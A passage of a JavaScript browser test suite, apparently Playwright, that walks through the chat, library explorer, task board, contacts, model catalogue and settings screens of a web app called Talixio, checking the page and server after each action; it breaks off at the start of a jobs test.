// The main things a person does in the app, each one checked against the page and the server.
import { execFileSync } from 'node:child_process';
import { join } from 'node:path';
const go = async (page, v) => { await page.evaluate(h => { location.hash = h; }, '#' + v); await page.waitForTimeout(500); };
const api = (page, path) => page.evaluate(p => fetch(p).then(r => r.json()), path);

const flows = {
  async store({ page, check }) {
    await go(page, 'apps');
    await page.waitForSelector('#apps-list .store-box', { timeout: 10000 });
    check('store: Apps shows what the store offers', (await page.textContent('#apps-list .store-box')).includes('The store has no app yet'));
    await page.click('#apps-list [data-ex=tasks]');
    await page.click('#app-to-store');
    await page.waitForSelector('#app-store-note', { timeout: 10000 });
    await page.fill('#app-store-note', 'For the team');
    await page.click('#app-store-form button');
    await page.waitForSelector('#app-store-send :text("Waiting for the admin")', { timeout: 10000 });
    check('store: an app is submitted from its page and waits for the admin', true);
  },
  async chat({ page, check }) {
    await go(page, 'chat');
    await page.fill('#input', 'hello from the browser');
    await page.click('#send');
    await page.waitForSelector('#thread :text("Echo mode")', { timeout: 10000 });
    check('chat: the reply shows', (await page.textContent('#thread')).includes('hello from the browser'));
  },
  async capture({ page, check }) {
    for (const [kind, text] of [['task', 'Call Sam about the offer'], ['note', 'Idea for the newsletter']]) {
      await go(page, 'chat');
      await page.click('#capture-btn');
      await page.click(`#capture-dialog [data-kind=${kind}]`);
      await page.fill('#cap-text', text);
      await page.click('#cap-save');
      await page.waitForSelector('#capture-dialog:not([open])', { state: 'attached' });
      const where = kind === 'task' ? (await go(page, 'board'), await page.textContent('#view-board')) : JSON.stringify(await api(page, 'api/library?folder=/Inbox'));
      check(`capture: the ${kind} is saved`, where.includes(text));
    }
  },
  async spaces({ page, check }) {
    await go(page, 'chat');
    await page.click('#space-btn');
    await page.click('#space-menu [data-act=new]');
    await page.waitForSelector('#space-dialog[open]');
    await page.fill('#sp-name', 'Acme');
    await page.fill('#sp-folder', '/Clients/Acme');
    await page.click('#space-form [type=submit]');
    await page.waitForTimeout(800);
    check('spaces: the new space is saved', JSON.stringify(await api(page, 'api/spaces')).includes('Acme'));
  },
  async library({ page, check }) {
    await go(page, 'library');
    await page.click('#lib-add'); await page.click('.row-menu-item >> text=New folder');
    await page.fill('#lib-inline-input', '/Clients/Alex');
    await page.press('#lib-inline-input', 'Enter');
    await page.waitForTimeout(800);
    check('library: the new folder shows', (await page.textContent('#lib-tree')).includes('Alex'));
    await page.evaluate(() => { location.hash = '#library'; }); await page.waitForTimeout(500);
    await page.hover('#lib-list .lib-row');
    await page.click('#lib-list .lib-row .kebab');
    await page.waitForTimeout(200);
    check('library: a row action menu opens', await page.isVisible('.row-menu') && (await page.textContent('.row-menu')).includes('New file here'));
    await page.keyboard.press('Escape');
    await page.click('#lib-add'); await page.click('.row-menu-item >> text=New note');
    await page.waitForTimeout(1000);
    check('library: a new note opens', await page.isVisible('#viewer-body'));
    await page.keyboard.press('Escape');
    await go(page, 'library');
    await page.click('#lib-q'); await page.check('#lib-regex');
    await page.fill('#lib-q', '\\.md$');
    await page.click('#lib-search button[type=submit]');
    await page.waitForTimeout(600);
    check('library: regex name search lists matches with checkboxes', await page.isVisible('#lib-results .rx-pick'));
    await page.click('#lib-results .rx-pick');
    await page.waitForTimeout(150);
    check('library: ticking a match shows the bulk bar', await page.isVisible('#lib-results .bulk-bar:not([hidden])'));
    // a unique file, found by regex, ticked and bulk-deleted: the results must refresh (no stale rows)
    await page.evaluate(async () => { const fd = new FormData(); fd.append('file', new File(['x'], 'rxdelme-unique.md')); fd.append('folder', '/Inbox'); await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd }); });
    await page.fill('#lib-q', 'rxdelme-unique');
    await page.click('#lib-search button[type=submit]');
    await page.waitForTimeout(500);
    check('library: regex finds the unique file', (await page.$$eval('#lib-results .rx-item', e => e.length)) === 1);
    await page.click('#lib-results .rx-pick');
    await page.waitForTimeout(100);
    await page.click('#lib-results .bulk-bar [data-a=del]'); // confirm
    await page.click('#lib-results .bulk-bar [data-a=del]'); // delete
    await page.waitForTimeout(600);
    check('library: after bulk delete the regex results refresh (no stale rows)', (await page.$$eval('#lib-results .rx-item', e => e.length)) === 0);
    await page.fill('#lib-q', '');
    await page.click('#lib-search button[type=submit]'); // empty: closes the search and shows the folder again
    await page.click('#lib-q'); await page.uncheck('#lib-regex');
    await page.waitForTimeout(300);
    await go(page, 'library');
    await page.fill('#lib-q', 'note');
    await page.waitForTimeout(800);
    await page.click('#lib-tree [data-trash]'); await page.waitForTimeout(500); await page.keyboard.press('Escape');
    for (const label of ['Recent changes', 'Shares']) {
      await page.click('#lib-folder-menu'); await page.click('.row-menu-item >> text=' + label); await page.waitForTimeout(500); await page.keyboard.press('Escape');
    }
    check('library: trash, recent and shares open', true);
    await page.setViewportSize({ width: 390, height: 780 }); await page.waitForTimeout(150);
    check('library mobile: toolbar is one + button', await page.isVisible('#lib-add') && !(await page.isVisible('.lib-cols')));
    await page.click('#lib-add'); await page.waitForTimeout(150);
    check('library mobile: the + opens every action', await page.isVisible('.row-menu') && (await page.textContent('.row-menu')).includes('New folder'));
    await page.keyboard.press('Escape');
    await page.setViewportSize({ width: 1280, height: 860 }); await page.waitForTimeout(100);
  },
  async board({ page, check }) {
    await go(page, 'board');
    await page.click('#board-new');
    await page.waitForSelector('#card-dialog[open]');
    await page.fill('#cd-title', 'Send the quote to acme.example');
    await page.click('#card-form [type=submit]');
    await page.waitForTimeout(800);
    check('board: the new card shows', (await page.textContent('#view-board')).includes('Send the quote'));
    await page.fill('#board-q', 'quote'); await page.waitForTimeout(400);
    check('board: the search keeps the card', (await page.textContent('#view-board')).includes('Send the quote'));
    await page.fill('#board-q', ''); await page.waitForTimeout(400);
  },
  async people({ page, check }) {
    await go(page, 'people');
    await page.click('#people-new');
    await page.fill('#person input[name=name]', 'Alex Martin');
    await page.fill('#person input[name=email]', 'alex@acme.example');
    await page.click('#person [type=submit]');
    await page.waitForTimeout(800);
    check('people: the contact is saved', JSON.stringify(await api(page, 'api/contacts')).includes('Alex Martin'));
  },
  async settings({ page, check }) {
    await go(page, 'settings');
    await page.fill('#set-search', 'theme');
    await page.waitForTimeout(400);
    await page.press('#set-search', 'Escape');
    await page.click('.set-sec[data-sec="essentials"] .set-tabs .tab:has-text("Appearance")');
    check('settings: one card per tab', await page.isVisible('#theme-mode') && !(await page.isVisible('#install-card')));
    await page.selectOption('#theme-mode', 'dark');
    await page.waitForTimeout(400);
    check('settings: the dark theme applies', await page.evaluate(() => document.documentElement.outerHTML.includes('dark')));
    await page.selectOption('#theme-mode', '');
    if (await page.isVisible('#doctor-run')) { await page.click('#doctor-run'); await page.waitForTimeout(1500); }
  },
  async otherAssistants({ page, check }) {
    await go(page, 'settings');
    await page.evaluate(() => { location.hash = '#settings/assistants'; });
    await page.waitForSelector('#fed-peers', { state: 'visible' });
    check('assistants: the section opens with the pairing card and says nothing is paired', await page.isVisible('#fed-invite') && /No assistant is paired|Aucun assistant/.test(await page.textContent('#fed-peers')));
    await page.click('.set-sec[data-sec="assistants"] .set-tabs .tab:nth-child(2)');
    await page.waitForSelector('#fed-offer', { state: 'visible' });
    check('assistants: the Overview tab shows what I offer and what I follow', /No question offered|Aucune question/.test(await page.textContent('#fed-offer')) && /No assistant is paired|Aucun assistant/.test(await page.textContent('#fed-follow')));
    await page.click('.set-sec[data-sec="assistants"] .set-tabs .tab:nth-child(3)');
    await page.waitForSelector('#fed-preview', { state: 'visible' });
    check('assistants: the exact digest is previewed before anything is shared', (await page.textContent('#fed-preview')).trim().length > 0 && await page.isVisible('#fed-publish'));
    await page.click('.set-sec[data-sec="assistants"] .set-tabs .tab:nth-child(1)');
    await page.click('#fed-have');
    check('assistants: "I have an invitation" opens the form, sharing in return is off by default', await page.isVisible('#fed-have-code') && !(await page.isChecked('#fed-have-digest')));
    await page.fill('#fed-have-code', 'tlx1.not-a-real-invitation');
    await page.click('#fed-have-go');
    await page.waitForFunction(() => /not valid|invalide/i.test(document.querySelector('#toast').textContent));
    check('assistants: an invalid invitation is refused with a plain message', true);
  },
  async modelCockpit({ page, check }) {
    await go(page, 'settings');
    await page.click('#set-nav a[data-sec="model"]');
    await page.waitForSelector('#mb-models .mb-table', { timeout: 10000 });
    const cat = await api(page, 'api/catalogue');
    await page.selectOption('#mb-ftype', 'Forecast');
    await page.waitForSelector('#mb-models .mb-table tbody tr .mname', { timeout: 10000 });
    check('cockpit: TimesFM is a row of the table (type Forecast)', /TimesFM/.test(await page.textContent('#mb-rows')));
    await page.selectOption('#mb-ftype', 'Decision');
    const dec = await page.textContent('#mb-rows');
    check('cockpit: decision models (Jev, Kev, Rizzo Flow) are rows of the table', /Jev/.test(dec) && /Kev/.test(dec) && /Rizzo/.test(dec));
    await page.click('#mb-rows button[data-u="decision"]:not(:disabled)');
    await page.waitForSelector('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', { timeout: 5000 });
    await page.fill('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', 'https://kev.example');
    await page.dispatchEvent('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', 'change');
    await page.waitForTimeout(600);
    check('cockpit: the decision address is saved from the card and the Decisions card shows it is on',
      (await api(page, 'api/settings')).groups.some(g => g.fields.some(f => f.key === 'TALIXIO_DECISION_URL' && f.value === 'https://kev.example')));
    await page.fill('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', '');
    await page.dispatchEvent('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', 'change');
    await page.waitForTimeout(400);
    await page.selectOption('#mb-ftype', '');
    check('cockpit: the catalogue API returns providers and models', (cat.providers?.length || 0) >= 8 && (cat.models?.length || 0) >= 20);
    // Nothing is "connected" in echo mode, so untick Available to see the whole seeded catalogue.
    await page.click('#mb-avail');
    await page.waitForSelector('#mb-models .mb-table tbody tr .mname', { timeout: 10000 });
    const tableText = await page.textContent('#mb-models .mb-table');
    check('cockpit: the Modèles table lists real models from several providers',
      /Haiku|Sonnet|Opus/.test(tableText) && /Mistral|Apertus|Qwen|Llama/.test(tableText));
    // AKI.IO (German sovereign, TL5) is in the catalogue and the provider filter can single it out.
    check('cockpit: AKI.IO is offered as a sovereign (TL5) provider', !!cat.providers.find(p => p.id === 'aki' && p.tl === 5));
    await page.selectOption('#mb-fprov', 'aki');
    await page.waitForTimeout(300);
    const akiRows = await page.$$eval('#mb-models .mb-table tbody tr .tl', els => els.map(e => e.textContent.trim()));
    check('cockpit: the provider filter narrows the table to AKI.IO sovereign models', akiRows.length > 0 && akiRows.every(t => t === '5'));
    await page.selectOption('#mb-fprov', '');
    await page.waitForTimeout(300);
    check('cockpit: a card per usage (fast, standard, deep, voice, images, embeddings, forecast, decisions)', (await page.$$('#mb-usages .ucard')).length === 8);
    check('cockpit: the provider count badge is filled', (await page.textContent('#mb-prov-c')).trim() === String(cat.providers.length));
    // Filter the catalogue down to voice models, then clear it.
    const before = (await page.$$('#mb-models .mb-table tbody tr')).length;
    await page.selectOption('#mb-ftype', 'Voice');
    await page.waitForTimeout(300);
    const voiceRows = await page.$$eval('#mb-models .mb-table tbody tr .ty', els => els.every(e => /voice|voix/i.test(e.textContent)));
    check('cockpit: the type filter narrows the table to one type', voiceRows);
    await page.selectOption('#mb-ftype', '');
    await page.waitForTimeout(300);
    check('cockpit: clearing the filter brings the models back', (await page.$$('#mb-models .mb-table tbody tr')).length === before);
    // Voice, Images and Embeddings are chosen from the table like the chat usages; their cards open what is left to set by hand.
    await page.click('#mb-usages .ucard[data-u="voice"]');
    check('cockpit: the Voice card opens the meeting settings (the model is picked in the table)',
      await page.isVisible('#mb-strip [data-set="TALIXIO_MEETING_TIER"]') && await page.isVisible('#mb-strip [data-set="TALIXIO_VOICE_NOTE_MAX_SECONDS"]'));
    await page.click('#mb-usages .ucard[data-u="embedding"]');
    check('cockpit: the Embeddings card filters the table to embedding models, each with an E button',
      (await page.$$eval('#mb-models .mb-table tbody tr', rs => rs.length > 0 && rs.every(r => /embed|recherche/i.test(r.querySelector('.ty')?.textContent || '')) && rs.filter(r => !r.classList.contains('offrow')).length > 0 && rs.filter(r => !r.classList.contains('offrow')).every(r => !!r.querySelector('button[data-u="embedding"]')))) && await page.isVisible('#mb-strip [data-set="TALIXIO_EMBEDDINGS_DIMS"]'));
    await page.click('#mb-usages .ucard[data-u="vision"]');
    check('cockpit: the Images card shows only models that can read an image, with an I button',
      (await page.$$eval('#mb-models .mb-table tbody tr', rs => rs.length > 0 && rs.every(r => !!r.querySelector('button[data-u="vision"]:not([disabled])') || r.classList.contains('offrow')))) && await page.isVisible('#mb-strip'));
    await page.click('#mb-usages .ucard[data-u="vision"]'); // deselect: back to the full table
    check('cockpit: deselecting the card clears the extra settings', !(await page.isVisible('#mb-strip .mb-strip')));
    // The Europe (GDPR) lock raises the trust floor to level 5.
    await page.click('#mb-lock');
    await page.waitForTimeout(400);
    check('cockpit: the Europe lock sets the trust floor to 5', await page.inputValue('#mb-ftl') === '5');
    const locked = await page.$$eval('#mb-models .mb-table tbody tr:not(.blocked) .tl', els => els.map(e => e.textContent.trim()));
    check('cockpit: under the lock only sovereign/local models remain assignable', locked.every(t => t === '5' || /loc/i.test(t)));
    await page.click('#mb-lock');
    await page.waitForTimeout(300);
    // The Providers tab reveals the provider/account cards; Budget reveals the budget card.
    await page.click('#mb-tabs .mb-tab[data-mtab="providers"]');
    await page.waitForTimeout(300);
    check('cockpit: the Fournisseurs tab shows the provider grid and hides the catalogue, Europe form and brain card',
      await page.isVisible('#mb-pgrid') && !(await page.isVisible('#mb-models')) && !(await page.isVisible('#eu-card')));
    // The Fournisseurs tab leads with a provider-card grid (one card per catalogue provider, plus the add card).
    await page.waitForSelector('#mb-pgrid .mb-pcard', { timeout: 10000 });
    check('cockpit: the Fournisseurs tab leads with a provider-card grid',
      (await page.$$('#mb-pgrid .mb-pcard:not(.add)')).length === cat.providers.length && await page.isVisible('#mb-pcard-add'));
    // A known provider connects inline with just its key — clicking Connect reveals a key field on the card itself.
    await page.click('#mb-pgrid .mb-pcard[data-pid="mistral"] [data-popen]');
    await page.waitForTimeout(200);
    check('cockpit: a provider card connects inline — Connect reveals a key field on the card',
      await page.isVisible('#mb-pgrid .mb-pcard[data-pid="mistral"] .pconnect .pkey'));
    // The add card still opens the advanced custom-provider form (the escape hatch for exotic providers).
    await page.click('#mb-pcard-add');
    await page.waitForTimeout(300);
    check('cockpit: the add-provider card opens the advanced account form', await page.isVisible('#acc-form'));
    await page.click('#mb-tabs .mb-tab[data-mtab="budget"]');
    await page.waitForTimeout(300);
    check('cockpit: the Budget tab shows the budget card', await page.evaluate(() =>
      !!document.querySelector('#view-settings .set-groups[data-groups="model"] .group-card[data-id="budget"]:not([hidden])')));
    await page.click('#mb-tabs .mb-tab[data-mtab="models"]');
    await page.waitForTimeout(200);
    // "Actualiser maintenant" refreshes the catalogue in place (no provider is connected in echo mode, so it stays the seed).
    await page.click('#mb-refresh');
    await page.waitForSelector('#mb-models .mb-table tbody tr .mname', { timeout: 10000 });
    check('cockpit: "Actualiser maintenant" refreshes the catalogue in place', (await page.$$('#mb-models .mb-table tbody tr .mname')).length > 0);
  },
  async libraryExplorer({ page, check }) {
    await page.evaluate(async () => {
      for (const [n, body] of [['b-medium.md', 'x'.repeat(500)], ['a-small.md', 'x'], ['c-large.md', 'x'.repeat(5000)]]) {
        const fd = new FormData(); fd.append('file', new File([body], n)); fd.append('folder', '/Explorer');
        await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd });
      }
    });
    await page.evaluate(() => { for (const k of Object.keys(localStorage)) if (k.endsWith('talixio.lib.sort')) localStorage.removeItem(k); });
    await page.evaluate(() => { location.hash = '#library/Explorer'; }); await page.waitForTimeout(900);
    const names = () => page.$$eval('#lib-list .lib-row[data-id] .name b', e => e.map(x => x.textContent));
    check('explorer: files are listed by name', JSON.stringify(await names()) === JSON.stringify(['a-small.md', 'b-medium.md', 'c-large.md']));
    check('explorer: the page above the list is one slim toolbar (< 70 px)', (await page.evaluate(() => document.querySelector('#lib-list').getBoundingClientRect().top - document.querySelector('#view-library').getBoundingClientRect().top)) < 130);
    await page.click('.lib-cols [data-sort=size]'); await page.waitForTimeout(150);
    check('explorer: a click on Size sorts by size', JSON.stringify(await names()) === JSON.stringify(['a-small.md', 'b-medium.md', 'c-large.md']));
    await page.click('.lib-cols [data-sort=size]'); await page.waitForTimeout(150);
    check('explorer: a second click reverses the order', JSON.stringify(await names()) === JSON.stringify(['c-large.md', 'b-medium.md', 'a-small.md']) && (await page.getAttribute('.lib-cols [data-sort=size]', 'aria-sort')) === 'descending');
    await page.reload(); await page.waitForTimeout(900);
    check('explorer: the sort is remembered', (await page.getAttribute('.lib-cols [data-sort=size]', 'aria-sort')) === 'descending');
    await page.click('.lib-cols [data-sort=name]'); await page.waitForTimeout(150);
    await page.hover('#lib-list .lib-row[data-id]');
    await page.check('#lib-list .lib-row[data-id] .pick');
    check('explorer: ticking a file replaces the toolbar with the selection bar', await page.isVisible('#lib-selbar') && !(await page.isVisible('#lib-toolbar')) && (await page.textContent('#lib-sel-n')).includes('1'));
    await page.click('#lib-list .lib-row[data-id]:nth-of-type(4) .name', { modifiers: ['Shift'] });
    await page.waitForTimeout(150);
    check('explorer: Shift-click selects the range', (await page.textContent('#lib-sel-n')).includes('3'));
    check('explorer: the zip link carries the selected ids', /ids=\d+,\d+,\d+/.test(await page.getAttribute('#lib-sel-zip', 'href')));
    await page.click('#lib-sel-clear'); await page.waitForTimeout(100);
    check('explorer: clearing brings the toolbar back', await page.isVisible('#lib-toolbar') && !(await page.isVisible('#lib-selbar')));
    await page.click('#lib-list .lib-row[data-id]', { modifiers: ['Control'] });
    await page.click('#lib-sel-del'); await page.waitForTimeout(100);
    check('explorer: delete asks for a second click', await page.isVisible('.lib-confirm'));
    await page.click('.lib-confirm [data-y]'); await page.waitForTimeout(800);
    check('explorer: the selection is deleted', (await names()).length === 2);
    await page.click('#lib-view-btn'); await page.waitForTimeout(150);
    check('explorer: the View panel opens with sort, group and filters', await page.isVisible('.lib-pop') && (await page.textContent('.lib-pop')).includes('Text and notes'));
    await page.click('.lib-pop [data-kind=image]'); await page.waitForTimeout(150);
    check('explorer: a filter shows its chip, the count, and an empty message', await page.isVisible('.lib-chip') && (await page.textContent('#lib-view-n')) === '1' && (await names()).length === 0 && (await page.textContent('#lib-list')).includes('No file matches'));
    await page.click('.lib-pop [data-kind=text]'); await page.waitForTimeout(150);
    check('explorer: another type brings the files back', (await names()).length === 2);
    await page.click('.lib-pop [data-group=kind]'); await page.waitForTimeout(150);
    check('explorer: grouping by type adds a header', await page.isVisible('#lib-list .lib-group'));
    await page.click('.lib-pop [data-clear]'); await page.click('.lib-pop [data-group=""]'); await page.waitForTimeout(150);
    check('explorer: clearing removes the chip and the groups', !(await page.isVisible('.lib-chip')) && !(await page.isVisible('#lib-list .lib-group')));
    await page.keyboard.press('Escape');
    await page.click('.lib-views [data-view=tiles]'); await page.waitForTimeout(150);
    check('explorer: Tiles view lays the files out as a grid without a column header',
      await page.evaluate(() => getComputedStyle(document.querySelector('#lib-list')).display === 'grid') && !(await page.isVisible('.lib-cols')) && (await page.$$('#lib-list .lib-row[data-id]')).length === 2);
    await page.click('.lib-views [data-view=list]'); await page.waitForTimeout(150);
    check('explorer: Compact list view hides Type and By', !(await page.isVisible('#lib-list .c-by')) && (await page.$$('#lib-list .lib-row[data-id]')).length === 2);
    await page.reload(); await page.waitForTimeout(900);
    check('explorer: the layout is remembered', await page.evaluate(() => document.querySelector('.lib-views [data-view=list]').classList.contains('on')));
    await page.click('.lib-views [data-view=details]'); await page.waitForTimeout(150);
    check('explorer: Details brings the column header back', await page.isVisible('.lib-cols'));
    // slice 4: tree toggle, up/back, context menu, keyboard
    check('explorer: the folder tree is shown on a wide screen', await page.isVisible('#lib-tree'));
    await page.click('#lib-tree-btn'); await page.waitForTimeout(100);
    check('explorer: the tree toggle hides the tree', !(await page.isVisible('#lib-tree')));
    await page.click('#lib-tree-btn'); await page.waitForTimeout(100);
    check('explorer: and brings it back', await page.isVisible('#lib-tree'));
    check('explorer: Up is enabled in a sub-folder', await page.isEnabled('#lib-up'));
    await page.click('#lib-up'); await page.waitForTimeout(700);
    check('explorer: Up goes to the parent folder', (await page.evaluate(() => location.hash)) === '#library' && !(await page.isEnabled('#lib-up')));
    check('explorer: Back is enabled after navigating', await page.isEnabled('#lib-back'));
    await page.click('#lib-back'); await page.waitForTimeout(700);
    check('explorer: Back returns to the folder', (await page.evaluate(() => location.hash)).startsWith('#library/Explorer'));
    await page.click('#lib-list .lib-row[data-id]', { button: 'right' }); await page.waitForTimeout(150);
    check('explorer: right click opens the file menu and selects the row', await page.isVisible('.row-menu') && (await page.textContent('.row-menu')).includes('Rename') && await page.isVisible('#lib-selbar'));
    await page.keyboard.press('Escape'); await page.waitForTimeout(100);
    await page.click('#lib-sel-clear');
    await page.click('#lib-list', { button: 'right', position: { x: 5, y: 3 } }).catch(() => {}); await page.keyboard.press('Escape');
    await page.focus('#lib-list .lib-row[data-id]'); await page.keyboard.press('Control+a'); await page.waitForTimeout(150);
    check('explorer: Ctrl+A selects every file', (await page.textContent('#lib-sel-n')).startsWith('2'));
    await page.keyboard.press('Escape'); await page.waitForTimeout(100);
    await page.keyboard.press('ArrowDown'); await page.waitForTimeout(100);
    check('explorer: arrow keys move between rows', await page.evaluate(() => document.activeElement.classList.contains('lib-row')));
    // 1.24.0: folder dates, pins, everything below, folders in a selection
    await page.evaluate(async () => { await fetch('api/library/folder', { method: 'POST', headers: { 'X-Talixio': '1', 'content-type': 'application/json' }, body: JSON.stringify({ path: '/Explorer/Sub' }) });
      const fd = new FormData(); fd.append('file', new File(['deep'], 'deep.md')); fd.append('folder', '/Explorer/Sub'); await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd }); });
    await page.evaluate(() => { location.hash = '#library'; }); await page.waitForTimeout(500);
    await page.evaluate(() => { location.hash = '#library/Explorer'; }); await page.waitForTimeout(900);
    check('explorer: a folder row shows the date of its newest file', (await page.textContent('#lib-list .lib-folder .c-mod')).trim().length > 0);
    await page.click('#lib-view-btn'); await page.click('.lib-pop [data-flat="1"]'); await page.waitForTimeout(500);
    check('explorer: Everything below lists the files of subfolders too, with their folder', (await names()).includes('deep.md') && !(await page.isVisible('#lib-list .lib-folder')));
    await page.click('.lib-pop [data-flat=""]'); await page.waitForTimeout(500); await page.keyboard.press('Escape');
    check('explorer: This folder brings the subfolders back', await page.isVisible('#lib-list .lib-folder') && !(await names()).includes('deep.md'));
    await page.click('#lib-list .lib-folder .pick'); await page.waitForTimeout(150);
    check('explorer: a folder can be selected; the bar offers zip and move but not delete', await page.isVisible('#lib-selbar') && !(await page.isVisible('#lib-sel-del')) && (await page.getAttribute('#lib-sel-zip', 'href')).includes('paths=%2FExplorer%2FSub'));
    await page.click('#lib-sel-clear');
    await page.click('#lib-list .lib-folder .kebab'); await page.click('.row-menu-item:has-text("Pin to the tree")'); await page.waitForTimeout(200);
    check('explorer: a pinned folder appears in the tree favourites', await page.isVisible('.tree-pins a[data-path="/Explorer/Sub"]'));
    await page.click('.tree-pins [data-unpin]'); await page.waitForTimeout(150);
    check('explorer: and can be unpinned', !(await page.isVisible('.tree-pins')));
    // slice 5: preview pane
    check('explorer: the preview pane is off by default', !(await page.isVisible('#lib-prev')));
    await page.click('#lib-prev-btn'); await page.waitForTimeout(150);
    check('explorer: the preview button opens an empty pane', await page.isVisible('#lib-prev') && (await page.textContent('#lib-prev')).includes('Select a file'));
    await page.click('#lib-list .lib-row[data-id] .name'); await page.waitForTimeout(500);
    check('explorer: a click previews the file instead of opening it', await page.isVisible('#lib-prev h3') && !(await page.isVisible('#viewer')) && await page.isVisible('#lib-list .lib-row.cur'));
    check('explorer: the pane shows an excerpt of a text file', await page.isVisible('#lib-prev .lib-prev-text'));
    await page.dblclick('#lib-list .lib-row[data-id] .name'); await page.waitForTimeout(500);
    check('explorer: a double click opens the file', await page.isVisible('#viewer'));
    await page.keyboard.press('Escape'); await page.waitForTimeout(300);
    await page.click('#lib-prev-btn'); await page.waitForTimeout(100);
    check('explorer: the pane closes again', !(await page.isVisible('#lib-prev')));
    await page.reload(); await page.waitForTimeout(900);
    await page.setViewportSize({ width: 390, height: 780 }); await page.waitForTimeout(200);
    check('explorer mobile: no column header, list starts under 130 px', !(await page.isVisible('.lib-cols')) && (await page.evaluate(() => document.querySelector('#lib-list').getBoundingClientRect().top)) < 190);
    await page.click('#lib-list .lib-row[data-id] .ico'); await page.waitForTimeout(150);
    check('explorer mobile: tapping the icon selects', await page.isVisible('#lib-selbar'));
    await page.click('#lib-sel-clear');
    await page.setViewportSize({ width: 1280, height: 860 }); await page.waitForTimeout(100);
  },
  async libraryMemory({ page, check }) {
    await go(page, 'settings');
    // Bibliothèque et mémoire: Search, Documents, Network drive; the knowledge graph lives in its own Learning section.
    await page.evaluate(() => { location.hash = '#settings/library'; }); await page.waitForTimeout(700);
    const libTabs = await page.$$eval('.set-sec[data-sec="library"] .set-tabs .tab', els => els.map(e => e.textContent.trim()));
    check('settings: Library and memory has Search, Documents and Network drive tabs', libTabs.length === 3 && /search|recherche/i.test(libTabs[0]) && /documents/i.test(libTabs[1]) && /drive|réseau/i.test(libTabs[2]), libTabs.join('|'));
    check('settings: Search shows the model in use and a way to choose it, not the old list of presets',
      await page.isVisible('#meaning [data-a="choose"]') && (await page.$$('#meaning .meaning-opt')).length === 0);
    await page.click('.set-sec[data-sec="library"] .set-tabs .tab:nth-child(2)');
    check('settings: Documents holds filing and image reading, and no transcription fields',
      await page.isVisible('#set-TALIXIO_AUTO_FILE') && await page.isVisible('#set-TALIXIO_VISION_INDEX') && !(await page.isVisible('#set-TALIXIO_TRANSCRIBE')));
    await page.evaluate(() => { location.hash = '#settings/learning'; }); await page.waitForTimeout(700);
    check('settings: the knowledge graph is in the Learning section', await page.isVisible('#set-TALIXIO_GRAPH') || await page.isVisible('.set-sec[data-sec="learning"] [data-key="TALIXIO_GRAPH"]'));
  },
  async sites({ page, check }) {
    await go(page, 'settings');
    await page.evaluate(() => { location.hash = '#settings/security'; }); await page.waitForTimeout(700);
    const box = '.field[data-key="TALIXIO_WEB_TRUSTED"] .sites';
    await page.click('.set-sec[data-sec="security"] .set-tabs .tab:has-text("Browser")');
    await page.waitForSelector(box, { timeout: 10000 });
    await page.fill(`${box} [data-site-new]`, 'https://www.LeMonde.fr/some/page');
    await page.press(`${box} [data-site-new]`, 'Enter');
    await page.fill(`${box} [data-site-new]`, 'gouv.fr'); await page.click(`${box} [data-site-add]`);
    check('sites: a full address is added as the bare site, listed as chips', JSON.stringify(await page.$$eval(`${box} .site-chip`, e => e.map(x => x.firstChild.textContent.trim()).sort())) === '["gouv.fr","lemonde.fr"]');
    check('sites: the Save bar appears', await page.isVisible('#set-save'));
    await page.fill(`${box} [data-site-new]`, 'not a site!'); await page.click(`${box} [data-site-add]`);
    check('sites: something that is not a site is refused with a message', await page.isVisible(`${box} [data-site-err]`) && (await page.$$(`${box} .site-chip`)).length === 2);
    await page.fill(`${box} [data-site-find]`, 'gouv');
    check('sites: the search filters the chips', (await page.$$(`${box} .site-chip`)).length === 1);
    await page.fill(`${box} [data-site-find]`, '');
    await page.click(`${box} [data-rm="gouv.fr"]`);
    await page.click('#set-save-btn'); await page.waitForTimeout(800);
    const val = async k => (await api(page, 'api/settings')).groups.flatMap(g => g.fields).find(f => f.key === k).value;
    check('sites: saved on the server, normalised', await val('TALIXIO_WEB_TRUSTED') === 'lemonde.fr');
    await page.fill('.field[data-key="TALIXIO_WEB_BLOCKED"] [data-site-new]', 'tracker.example'); await page.click('.field[data-key="TALIXIO_WEB_BLOCKED"] [data-site-add]');
    await page.click('#set-save-btn'); await page.waitForTimeout(800);
    check('sites: the blocked list is saved on its own', await val('TALIXIO_WEB_BLOCKED') === 'tracker.example');
  },
  async notifications({ page, check }) {
    await go(page, 'notifications');
    for (const b of ['#notif-all-read', '#notif-clear']) if (await page.isVisible(b) && await page.isEnabled(b)) await page.click(b);
    await page.waitForTimeout(400);
    check('notifications: the buttons work', true);
  },
  async boardViews({ page, check }) {
    await go(page, 'board');
    await page.click('#view-board [data-mode=list]'); await page.waitForTimeout(500);
    await page.fill('#view-board .qa-in', 'Call Alex tomorrow 9am p1 #sales');
    await page.waitForTimeout(200);
    check('quick add: the date and priority are read', (await page.textContent('#view-board .qa-chips')).length > 0);
    await page.press('#view-board .qa-in', 'Enter');
    await page.waitForTimeout(800);
    check('quick add: the task shows in the list', (await page.textContent('#view-board')).includes('Call Alex'));
    for (const m of ['today', 'week', 'calendar', 'overall', 'board']) {
      await page.click(`#view-board [data-mode=${m}]`); await page.waitForTimeout(600);
      check(`board: the ${m} view shows`, (await page.textContent('#view-board')).length > 0);
    }
    await page.click('#view-board .kcard');
    await page.waitForSelector('#card-dialog[open]');
    await page.fill('#cd-title', 'Call Alex about the renewal');
    await page.selectOption('#cd-status', { index: 2 });
    await page.click('#card-form [type=submit]');
    await page.waitForTimeout(800);
    check('board: the edited card is saved', (await page.textContent('#view-board')).includes('about the renewal'));
  },
  async chatSearch({ page, check }) {
    await go(page, 'chat');
    await page.fill('#input', 'remember the kiwi order');
    await page.click('#send');
    await page.waitForSelector('#thread :text("kiwi order")');
    await page.click('#chat-search-btn');
    await page.fill('#chat-search-q', 'kiwi');
    await page.waitForTimeout(1200);
    check('chat search: the message is found', (await page.textContent('#chat-search-results')).includes('kiwi'));
    await page.keyboard.press('Escape');
  },
  async jobs({ page, check, root, data }) {
    // with no directive yet, the section shows a discoverable one-line hint rather than nothing
    await go(page, 'jobs');
    await page.waitForSelector('#directives .dir-hint', { timeout: 5000 });
